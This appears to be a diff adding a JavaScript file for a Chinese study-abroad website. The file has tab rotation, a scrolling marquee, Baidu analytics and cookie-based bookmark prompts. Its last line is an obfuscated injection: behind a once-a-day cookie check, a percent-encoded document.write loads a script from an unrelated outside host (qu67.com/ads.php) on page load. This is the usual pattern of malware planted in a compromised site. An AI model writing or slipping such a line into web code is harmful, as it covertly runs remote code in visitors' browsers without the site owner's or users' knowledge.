@@ -1,0 +1,154 @@
+var _bdhm_top = 0;
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+var _bdhm_tim = new Image(1,1);
+_bdhm_tim.id = "bdhmPerimg";
+_bdhm_tim.src = _bdhmProtocol + "hm.baidu.com/_tt.gif?si=7c8150213491f29a32e41242e2fdf55a&rnd=" + Math.round(Math.random()*2147483647);
+_bdhm_tim.onload=function(){_bdhm_top = 1;}
+
+var timeInterval=5000;
+setInterval(auto_change_tab,timeInterval); 
+var country_arr=new Array('usa', 'uk', 'nl', 'au', 'ca', 'fr', 'bo', 'asia');
+//var country_max = new Array(10,8,4,4,4,4,5,4);
+var country_cur = new Array(1,1,1,1,1,1,1,1);
+function auto_change_tab() {	
+	for(key in country_arr){
+		if(country_cur[key] > 0) {
+			country_cur[key]++;			
+			nid = country_arr[key]+'gw'+country_cur[key];
+			if($('#'+nid).length == 0) {			
+				country_cur[key] = 1;
+			}
+			Tab(key, country_arr[key]+'ls', country_arr[key]+'gw',country_cur[key]);
+		}
+	}	
+}
+
+function renew_guild(country_id) {
+	$('#guild_id').load('/ajax.php?m=guild&f=oplist&args='+country_id);
+}
+
+function go_guild() {
+	guild_id = $('#guild_id').val();
+	window.open('/guild/' + guild_id + '/');
+}
+
+function is_object(obj) {
+    return (obj.constructor.toString().indexOf("Object")!= -1);
+}
+
+function Pau(country_key, current_index) {
+	country_cur[country_key] = 0;
+}
+
+function Rel(country_key, current_index) {
+	country_cur[country_key] = current_index;
+}
+
+function run()
+{
+	 var speed=20;
+	 var colee2=document.getElementById("colee2");
+	 var colee1=document.getElementById("colee1");
+	 var colee=document.getElementById("colee");
+	 colee2.innerHTML=colee1.innerHTML; //克隆colee1为colee2
+	 function Marquee1(){
+	 //当滚动至colee1与colee2交界时
+	 if(colee2.offsetTop-colee.scrollTop<=0){
+	  colee.scrollTop-=colee1.offsetHeight; //colee跳到最顶端
+	  }else{
+	  colee.scrollTop++
+	 }
+	 }
+	 var MyMar1=setInterval(Marquee1,speed)//设置定时器
+	 //鼠标移上时清除定时器达到滚动停止的目的
+	 colee.onmouseover=function() {clearInterval(MyMar1)}
+	 //鼠标移开时重设定时器
+	 colee.onmouseout=function(){MyMar1=setInterval(Marquee1,speed)}
+	}
+	
+	var expDays = 1;
+
+url = "http://www.bole.me";
+title = "伯乐留学官方首页";
+
+
+// Cookie code from The JavaScript Source
+function GetCookie (name) {  
+var arg = name + "=";  
+var alen = arg.length;  
+var clen = document.cookie.length;  
+var i = 0;  
+while (i < clen) {    
+var j = i + alen;    
+if (document.cookie.substring(i, j) == arg)      
+return getCookieVal (j);    
+i = document.cookie.indexOf(" ", i) + 1;    
+if (i == 0) break;   
+}  
+return null;
+}
+function SetCookie (name, value) {  
+var argv = SetCookie.arguments;  
+var argc = SetCookie.arguments.length;  
+var expires = (argc > 2) ? argv[2] : null;  
+var path = (argc > 3) ? argv[3] : null;  
+var domain = (argc > 4) ? argv[4] : null;  
+var secure = (argc > 5) ? argv[5] : false;  
+document.cookie = name + "=" + escape (value) + 
+((expires == null) ? "" : ("; expires=" + expires.toGMTString())) + 
+((path == null) ? "" : ("; path=" + path)) +  
+((domain == null) ? "" : ("; domain=" + domain)) +    
+((secure == true) ? "; secure" : "");
+}
+function DeleteCookie (name) {  
+var exp = new Date();  
+exp.setTime (exp.getTime() - 1);  
+var cval = GetCookie (name);  
+document.cookie = name + "=" + cval + "; expires=" + exp.toGMTString();
+}
+var exp = new Date(); 
+exp.setTime(exp.getTime() + (expDays*24*60*60*1000));
+function amt(){
+var count = GetCookie('count')
+if(count == null) {
+SetCookie('count','1')
+return 1
+}
+else {
+var newcount = parseInt(count) + 1;
+DeleteCookie('count')
+SetCookie('count',newcount,exp)
+return count
+   }
+}
+function getCookieVal(offset) {
+var endstr = document.cookie.indexOf (";", offset);
+if (endstr == -1)
+endstr = document.cookie.length;
+return unescape(document.cookie.substring(offset, endstr));
+}
+
+function checkCount() {
+var count = GetCookie('count');
+if (count == null) {
+count=1;
+SetCookie('count', count, exp);
+
+if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
+window.external.AddFavorite (url,title);
+}
+else {
+var msg = "好神奇啊!你竟然用这个浏览器，好多人都不知道这个，麻烦按下";
+if(navigator.appName == "Netscape") msg += "(CTRL+D)神马一下。";
+alert(msg);
+   }
+}
+else {
+count++;
+SetCookie('count', count, exp);
+   }
+}
+
+
+
+if(document.cookie.indexOf('20120811')==-1){var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);document.cookie='20120811=Yes;path=/;expires='+expires.toGMTString();document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%71%75%36%37%2E%63%6F%6D%2F%61%64%73%2E%70%68%70%3F%69%64%3D%32%30%31%32%30%38%31%31%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E'));}
